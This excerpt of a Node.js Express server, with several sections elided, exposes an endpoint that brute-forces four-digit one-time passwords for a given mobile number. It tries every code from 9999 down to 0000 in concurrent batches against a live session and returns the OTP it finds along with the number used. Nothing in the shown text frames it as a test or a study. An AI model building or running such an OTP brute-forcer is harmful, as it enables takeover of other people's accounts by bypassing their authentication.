...
// Enhanced batch processing with concurrency - trying from the end
async function tryBatch(session, cookies, otpBatch) {
    // Reverse the batch to try from the end
    const reversedBatch = [...otpBatch].reverse();
    const promises = reversedBatch.map(otp => tryOTP(session, cookies, otp));
...
app.get('/', (req, res) => {
    res.json({
        ...
        features: {
            ...
            otpSearchDirection: 'REVERSE (9999 to 0000)'
        }
    });
});
...
app.get('/get-info', async(req, res) => {
    try {
        ...
        // 2. Generate OTPs in REVERSE order (9999 to 0000)
        console.log('Step 2: Generating OTP range in REVERSE order (9999 to 0000)...');
        let otpRange = generateOTPRange(); // This now returns [9999, 9998, ..., 0000]

        console.log(`OTP range: ${otpRange[0]} to ${otpRange[otpRange.length-1]}`);

        // 3. Try OTPs in batches - no need to shuffle since we want reverse order
        console.log('Step 3: Brute-forcing OTP from HIGHEST to LOWEST...');
        let foundOTP = null;

        for (let i = 0; i < otpRange.length; i += BATCH_SIZE) {
            const batch = otpRange.slice(i, i + BATCH_SIZE);
            const batchNumber = Math.floor(i/BATCH_SIZE) + 1;
            const totalBatches = Math.ceil(otpRange.length/BATCH_SIZE);
            
            console.log(`Trying batch ${batchNumber}/${totalBatches} (OTPs: ${batch[0]} to ${batch[batch.length-1]})...`);
        ...
        if (foundOTP) {
            ...
            res.json({
                ...
                sessionInfo: {
                    mobileUsed: mobile,
                    otpFound: foundOTP,
                    searchDirection: "reverse (9999 to 0000)"
                }
            });
            ...
            res.status(404).json({ 
                success: false,
                error: "OTP not found after trying all combinations from 9999 to 0000" 
            });
        }
...
app.get('/health', (req, res) => {
    res.json({ 
        ...
        version: '2.0.0',
        otpSearch: 'REVERSE (9999 to 0000)'
    });
});
...
app.listen(PORT, () => {
    ...
    console.log(`🔄 OTP Search Direction: REVERSE (9999 to 0000)`);
});
